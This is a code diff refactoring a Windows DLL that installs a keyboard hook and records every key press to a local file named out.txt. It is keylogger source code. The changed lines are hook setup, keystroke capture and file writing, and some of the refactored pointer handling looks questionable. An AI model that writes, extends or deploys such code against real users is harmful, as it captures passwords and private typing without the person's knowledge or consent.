@@ -4,22 +4,44 @@
 
 #define EXTERN_DLL_EXPORT extern "C" __declspec(dllexport)
 
-HHOOK hKeyboardHook = NULL;
-HINSTANCE hInstance = NULL;
-file_handle outputFile(L"out.txt");
+static std::unique_ptr<HHOOK> g_hKeyboardHook = NULL;
+std::unique_ptr<HINSTANCE> g_hInstance = NULL;
+const std::unique_ptr<Guard> g_outputFile = std::make_unique<Guard>(L"out.txt");
+
+VOID WriteToFile(const char* string, const HANDLE& hFile)
+{
+    DWORD dwBytesWritten = 0;
+    DWORD dwBytesToWrite = static_cast<DWORD>(sizeof(*string));
+
+    BOOL bErrorFlag = FALSE;
+
+    bErrorFlag = WriteFile(
+        hFile,
+        string,
+        dwBytesToWrite,
+        &dwBytesWritten,
+        NULL);
+
+    if (FALSE == bErrorFlag)
+    {
+        std::cout << "Terminal failure: Unable to write to file.\n";
+    }
+    else
+    {
+        if (dwBytesWritten != dwBytesToWrite)
+        {
+            std::cout << "Error: dwBytesWritten != dwBytesToWrite\n";
+        }
+    }
+}
 
 LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 {
     if (code >= 0 && code == HC_ACTION && ((lParam >> 30) & 1))
     {
-        TCHAR msg[64];
-        wsprintf(msg, TEXT("key press\n"));
-        OutputDebugString(msg);
-
         if (wParam == VK_ESCAPE)
         {
-            wsprintf(msg, TEXT("ESCAPE\n"));
-            OutputDebugString(msg);
+            PostQuitMessage(0);
         }
         
         if ((wParam == VK_SPACE) || (wParam == VK_RETURN) || (wParam >= 0x2f))
@@ -28,30 +50,38 @@ LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
             char ch = '\n';
             WORD w = NULL;
             UINT scan = 0;
+            HANDLE file = g_outputFile->GetHandle();
 
             if (GetKeyboardState(ks))
             {   
-                ToAscii(wParam, scan, ks, &w, 0);
-                ch = char(w);
-                outputFile.WriteToFile(&ch);
+                ToAscii(static_cast<UINT>(wParam), scan, ks, &w, 0);
+                if (w) {
+                    ch = static_cast<char>(w);
+                    if (file)
+                    {
+                        WriteToFile(&ch, file);
+                    }
+                }
             }
         }
     }
-    return CallNextHookEx(hKeyboardHook, code, wParam, lParam);
+    return CallNextHookEx(*g_hKeyboardHook, code, wParam, lParam);
 }
 
-EXTERN_DLL_EXPORT BOOL CALLBACK SetKeyboardHook(DWORD thread)
+EXTERN_DLL_EXPORT BOOL CALLBACK SetKeyboardHook(const DWORD& thread)
 {    
-    if (!hKeyboardHook && hInstance && (thread >= 0))
-        hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyboardProc, hInstance, thread);
-    return hKeyboardHook ? TRUE : FALSE;
+    if (!g_hKeyboardHook && *g_hInstance && (thread >= 0))
+        g_hKeyboardHook = std::make_unique<HHOOK>(SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyboardProc, *g_hInstance, thread));
+    return *g_hKeyboardHook ? TRUE : FALSE;
 }
 
 EXTERN_DLL_EXPORT VOID CALLBACK UnhookKeyboardHook()
 {
-    if (hKeyboardHook)
-        UnhookWindowsHookEx(hKeyboardHook);
-    hKeyboardHook = NULL;
+    if (g_hKeyboardHook) 
+    {
+        UnhookWindowsHookEx(*g_hKeyboardHook);
+    }
+    g_hKeyboardHook.release();
 }
 
 BOOL APIENTRY DllMain( HMODULE hModule,
@@ -62,11 +92,18 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
-        hInstance = hModule;
+        g_hInstance = std::make_unique<HINSTANCE>(hModule);
         break;
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
+        if (lpReserved == NULL)
+        {
+            g_hKeyboardHook.reset(0);
+        }
+
+        g_hKeyboardHook.release();
+        g_hInstance.release();
         break;
     }
     return TRUE;
